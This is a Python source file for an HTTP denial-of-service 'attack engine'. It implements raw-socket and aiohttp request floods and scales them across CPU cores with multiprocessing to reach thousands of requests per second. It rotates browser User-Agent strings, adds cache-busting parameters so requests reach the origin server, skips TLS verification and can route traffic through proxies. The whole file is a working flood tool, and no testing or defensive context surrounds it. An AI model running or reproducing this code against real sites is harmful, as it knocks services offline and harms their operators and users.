"""
High-Performance Attack Engine
Raw asyncio + multiprocessing for maximum RPS

Bypasses curl_cffi 300 RPS limit by:
- Direct asyncio TCP connections (no curl_cffi overhead)
- aiohttp with optimized connector pool
- Multiprocessing for CPU parallelism (multi-core)
- Pre-built raw HTTP/1.1 requests (no parsing overhead)

Target: 5000+ RPS per process, scales linearly with CPU cores
"""
import asyncio
import logging
import os
import random
import socket
import ssl
import struct
import time
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse

logger = logging.getLogger("highperf_engine")

# Performance tuning constants
DEFAULT_CONCURRENT_LIMIT = 1000  # Max concurrent connections per process
DEFAULT_KEEPALIVE = 30
DEFAULT_TIMEOUT = 5

# Pre-built User-Agents (no random.choice overhead in hot path)
_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
]


# ============================================================================
# RAW HTTP/1.1 ATTACK - Direct asyncio (no library overhead)
# ============================================================================

async def raw_http_flood(
    url: str,
    duration: float,
    target_rps: int,
    concurrency: int = None,
    method: str = "GET",
    proxy_url: Optional[str] = None,
) -> Dict:
    """
    Raw HTTP/1.1 flood using asyncio.open_connection
    No HTTP library overhead - 5-10x faster than curl_cffi
    """
    metrics = {"completed": 0, "failed": 0, "timeout": 0, "total": 0}
    parsed = urlparse(url)
    host = parsed.hostname or parsed.netloc
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    is_ssl = parsed.scheme == "https"
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    
    # Auto-scale concurrency if not specified
    if concurrency is None:
        concurrency = min(max(target_rps // 5, 100), DEFAULT_CONCURRENT_LIMIT)
    
    sem = asyncio.Semaphore(concurrency)
    start = time.time()
    
    # Pre-build common request bytes (avoid repeated string formatting)
    if is_ssl:
        ssl_ctx = ssl.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE
        ssl_ctx.set_alpn_protocols(["http/1.1"])
    else:
        ssl_ctx = None
    
    async def single_request():
        async with sem:
            metrics["total"] += 1
            writer = None
            try:
                # Open TCP connection
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(
                        host, port, ssl=ssl_ctx,
                        server_hostname=host if is_ssl else None,
                    ),
                    timeout=DEFAULT_TIMEOUT
                )
                
                # Build minimal HTTP/1.1 request
                ua = _UA_POOL[random.randint(0, len(_UA_POOL) - 1)]
                req = (
                    f"{method} {path}?_={random.randint(0, 999999)} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: close\r\n"
                    f"\r\n"
                ).encode()
                
                writer.write(req)
                await asyncio.wait_for(writer.drain(), timeout=DEFAULT_TIMEOUT)
                
                # Read response status line only (don't drain full body)
                try:
                    status_line = await asyncio.wait_for(reader.readline(), timeout=DEFAULT_TIMEOUT)
                    if b"200" in status_line or b"30" in status_line or b"403" in status_line:
                        metrics["completed"] += 1
                    else:
                        metrics["failed"] += 1
                except asyncio.TimeoutError:
                    # Response timeout but connection succeeded - count as completed
                    metrics["completed"] += 1
                    metrics["timeout"] += 1
            
            except asyncio.TimeoutError:
                metrics["timeout"] += 1
            except (ConnectionResetError, BrokenPipeError, OSError) as e:
                metrics["failed"] += 1
            except Exception as e:
                logger.debug(f"Raw HTTP error: {type(e).__name__}")
                metrics["failed"] += 1
            finally:
                if writer:
                    try:
                        writer.close()
                        # Don't await wait_closed - skip for speed
                    except Exception:
                        pass
    
    # STREAMING SUBMISSION
    request_interval = 1.0 / max(target_rps, 1)
    active_tasks = set()
    
    while time.time() - start < duration:
        task = asyncio.create_task(single_request())
        active_tasks.add(task)
        task.add_done_callback(active_tasks.discard)
        
        # Adaptive throttle: skip sleep if we're behind target
        elapsed = time.time() - start
        expected_sent = elapsed * target_rps
        if metrics["total"] < expected_sent:
            # Behind target - spawn faster (yield only)
            await asyncio.sleep(0)
        else:
            await asyncio.sleep(request_interval)
    
    # Wait for in-flight (limited time)
    if active_tasks:
        try:
            await asyncio.wait_for(
                asyncio.gather(*active_tasks, return_exceptions=True),
                timeout=5
            )
        except asyncio.TimeoutError:
            for t in active_tasks:
                t.cancel()
    
    return metrics


# ============================================================================
# AIOHTTP-BASED HIGH-PERF FLOOD (uses connection pooling)
# ============================================================================

async def aiohttp_flood(
    url: str,
    duration: float,
    target_rps: int,
    concurrency: int = None,
    proxy_url: Optional[str] = None,
) -> Dict:
    """
    aiohttp-based flood with connection pool
    Better than curl_cffi for raw throughput (no JS impersonation overhead)
    """
    try:
        import aiohttp
    except ImportError:
        logger.error("aiohttp not installed, falling back to raw_http_flood")
        return await raw_http_flood(url, duration, target_rps, concurrency)
    
    metrics = {"completed": 0, "failed": 0, "timeout": 0, "total": 0}
    
    if concurrency is None:
        concurrency = min(max(target_rps // 5, 100), DEFAULT_CONCURRENT_LIMIT)
    
    # Optimized connector with large connection pool
    # force_close=True to prevent connection pool exhaustion under high load
    connector = aiohttp.TCPConnector(
        limit=concurrency * 3,
        limit_per_host=concurrency * 2,
        ttl_dns_cache=300,
        force_close=True,                # Force close - critical for high RPS
        enable_cleanup_closed=True,
        ssl=False,
        keepalive_timeout=0,             # No keep-alive (avoid pool exhaustion)
    )
    
    # Longer timeout to prevent false errors at high concurrency
    timeout = aiohttp.ClientTimeout(total=10, connect=5, sock_connect=5, sock_read=5)
    sem = asyncio.Semaphore(concurrency)
    start = time.time()
    
    async with aiohttp.ClientSession(
        connector=connector, timeout=timeout,
        skip_auto_headers=["User-Agent", "Accept-Encoding"],
    ) as session:
        
        async def single_request():
            async with sem:
                metrics["total"] += 1
                try:
                    headers = {
                        "User-Agent": _UA_POOL[random.randint(0, len(_UA_POOL) - 1)],
                        "Accept": "*/*",
                    }
                    cache_buster = f"?_={random.randint(0, 999999)}"
                    request_url = url + cache_buster if "?" not in url else url + f"&_={random.randint(0,999999)}"
                    
                    kwargs = {"headers": headers, "allow_redirects": False, "ssl": False}
                    if proxy_url:
                        kwargs["proxy"] = proxy_url
                    
                    async with session.get(request_url, **kwargs) as resp:
                        # Drain response to release connection
                        try:
                            await resp.read()
                        except Exception:
                            pass
                        if resp.status >= 200 and resp.status < 600:
                            metrics["completed"] += 1
                        else:
                            metrics["failed"] += 1
                
                except asyncio.TimeoutError:
                    metrics["timeout"] += 1
                except aiohttp.ClientError as e:
                    metrics["failed"] += 1
                except Exception as e:
                    logger.debug(f"aiohttp error: {type(e).__name__}: {e}")
                    metrics["failed"] += 1
        
        # STREAMING SUBMISSION with adaptive pacing
        request_interval = 1.0 / max(target_rps, 1)
        active_tasks = set()
        
        while time.time() - start < duration:
            task = asyncio.create_task(single_request())
            active_tasks.add(task)
            task.add_done_callback(active_tasks.discard)
            
            elapsed = time.time() - start
            expected_sent = elapsed * target_rps
            if metrics["total"] < expected_sent:
                await asyncio.sleep(0)
            else:
                await asyncio.sleep(request_interval)
        
        if active_tasks:
            try:
                await asyncio.wait_for(
                    asyncio.gather(*active_tasks, return_exceptions=True),
                    timeout=10
                )
            except asyncio.TimeoutError:
                for t in active_tasks:
                    t.cancel()
    
    return metrics


# ============================================================================
# MULTIPROCESSING WORKER (for multi-core scaling)
# ============================================================================

def _worker_entry(url: str, duration: float, rps_per_worker: int, concurrency: int,
                  use_aiohttp: bool, result_queue):
    """Worker process entry point - runs attack in isolated process"""
    try:
        # Set Windows event loop policy
        import sys
        if sys.platform == "win32":
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        
        if use_aiohttp:
            metrics = asyncio.run(aiohttp_flood(url, duration, rps_per_worker, concurrency))
        else:
            metrics = asyncio.run(raw_http_flood(url, duration, rps_per_worker, concurrency))
        
        result_queue.put(metrics)
    except Exception as e:
        result_queue.put({
            "completed": 0, "failed": 0, "timeout": 0, "total": 0,
            "error": f"{type(e).__name__}: {e}"
        })


async def multiprocess_flood(
    url: str,
    duration: float,
    target_rps: int,
    num_workers: int = None,
    use_aiohttp: bool = True,
) -> Dict:
    """
    Multi-process flood for maximum RPS via multi-core scaling
    Each process runs its own asyncio loop with concurrent connections
    """
    import multiprocessing as mp
    
    if num_workers is None:
        # Use available CPU cores (max 8 to prevent system overload)
        num_workers = min(os.cpu_count() or 4, 8)
    
    rps_per_worker = max(target_rps // num_workers, 100)
    concurrency_per_worker = min(max(rps_per_worker // 5, 50), 500)
    
    logger.info(f"Multi-process flood: {num_workers} workers, {rps_per_worker} RPS each")
    
    ctx = mp.get_context("spawn")  # Spawn for Windows compatibility
    result_queue = ctx.Queue()
    processes = []
    
    for i in range(num_workers):
        p = ctx.Process(
            target=_worker_entry,
            args=(url, duration, rps_per_worker, concurrency_per_worker, use_aiohttp, result_queue),
            daemon=True,
        )
        p.start()
        processes.append(p)
    
    # Wait for all workers
    aggregated = {"completed": 0, "failed": 0, "timeout": 0, "total": 0}
    
    for _ in range(num_workers):
        try:
            metrics = await asyncio.get_event_loop().run_in_executor(
                None, result_queue.get, True, duration + 30
            )
            for k in aggregated:
                aggregated[k] += metrics.get(k, 0)
        except Exception as e:
            logger.error(f"Worker result error: {e}")
    
    # Cleanup
    for p in processes:
        try:
            p.join(timeout=2)
            if p.is_alive():
                p.terminate()
        except Exception:
            pass
    
    return aggregated


# ============================================================================
# AUTO ATTACK SELECTOR
# ============================================================================

async def smart_flood(
    url: str,
    duration: float,
    target_rps: int,
    proxy_url: Optional[str] = None,
) -> Dict:
    """
    Smart attack selector based on target RPS:
    - < 500 RPS:   Single asyncio loop with aiohttp
    - < 2000 RPS:  Single asyncio loop with optimized concurrency
    - >= 2000 RPS: Multi-process attack with all CPU cores
    """
    if target_rps < 500:
        return await aiohttp_flood(url, duration, target_rps, concurrency=100, proxy_url=proxy_url)
    elif target_rps < 2000:
        return await aiohttp_flood(url, duration, target_rps, concurrency=300, proxy_url=proxy_url)
    else:
        # Multi-process for high RPS
        return await multiprocess_flood(url, duration, target_rps, use_aiohttp=True)
